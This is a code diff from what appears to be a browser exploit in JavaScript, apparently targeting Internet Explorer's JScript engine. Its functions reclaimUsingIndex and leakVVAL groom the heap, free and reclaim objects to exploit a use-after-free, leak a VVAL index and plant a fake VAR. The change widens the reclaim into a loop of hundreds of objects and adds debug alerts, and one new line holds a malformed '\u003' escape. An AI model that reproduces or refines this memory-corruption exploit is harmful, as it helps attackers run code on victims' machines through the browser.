@@ -71,21 +71,39 @@
 		
 		
 		function reclaimUsingIndex(value, fakeVARasPropertyName){ 
-			CollectGarbage(); //idk why
-			overlaybackup[overlaybackupIndex] = null; //free the...umm this will be a VVAL_disguise_as_GcBlock associated with the leaked index
-			CollectGarbage(); //CollectGarbage to really free the above into heap
-			overlaybackup[overlaybackupIndex] = new Object();
-			overlaybackup[overlaybackupIndex][staticPropertyNameforRECLAIM] = 1; // 0x17a property name size for 0x648 VVAL/NameList allocation size
-			overlaybackup[overlaybackupIndex]["BBBBBBBBB"] = 1; //18(9*2) bytes for 32bit...22(11*2) bytes for 64bit
-	        overlaybackup[overlaybackupIndex]["\u0003"] = 1; 
-			overlaybackup[overlaybackupIndex][fakeVARasPropertyName] = value; //mutable fakeVAR (which we also have a pointer to)
+			var PrecisionReClaim = 500; //precision reclaim on randomized LFH
+			
+			CollectGarbage(); 
+			overlaybackup[overlaybackupIndex] = null;
+			for(i = 0; i< PrecisionReClaim; i++){
+				overlaybackup[i] = null;
+			}
+			CollectGarbage();
+			for(i = 0; i< (PrecisionReClaim+100); i++){
+				overlaybackup[i] = new Object();
+				overlaybackup[i][staticPropertyNameforRECLAIM] = 1;
+				overlaybackup[i]["BBBBBBBBB"] = 1;
+				overlaybackup[i]["\u003"] = 1;
+				overlaybackup[i][fakeVARasPropertyName] = value;
+				
+			}
+			alert("done reclaim but we reclaim?");
+		
+			//CollectGarbage(); //idk why
+			//overlaybackup[overlaybackupIndex] = null; //free the...umm this will be a VVAL_disguise_as_GcBlock associated with the leaked index
+			//CollectGarbage(); //CollectGarbage to really free the above into heap
+			//overlaybackup[overlaybackupIndex] = new Object();
+			//overlaybackup[overlaybackupIndex][staticPropertyNameforRECLAIM] = 1; // 0x17a property name size for 0x648 VVAL/NameList allocation size
+			//overlaybackup[overlaybackupIndex]["BBBBBBBBB"] = 1; //18(9*2) bytes for 32bit...22(11*2) bytes for 64bit
+	        //overlaybackup[overlaybackupIndex]["\u0003"] = 1; 
+			//overlaybackup[overlaybackupIndex][fakeVARasPropertyName] = value; //mutable fakeVAR (which we also have a pointer to)
 			
 		} //ending reclaimUsingIndex
 		
 		
 		
 		function leakVVAL(){
-		
+			CollectGarbage(); //This GC is essential for re-claims with randomized LFH on precise regions (such as VVAL re-claim), but it also allows for the GcBlock re-claim count to be drastically reduced (otherwise 20000+ was needed, as in the original exploit)
 		
 			for(i = 0; i < 310; i++) tosort[i] = [0, 0];
 			var LFHBlocks = new Array();
@@ -148,6 +166,7 @@
 						break;
 					}
 				}
+				
 				reclaimUsingIndex(0x11, "A");
 				alert("Leaked overlaybackup index: ");
 				alert(overlaybackupIndex);
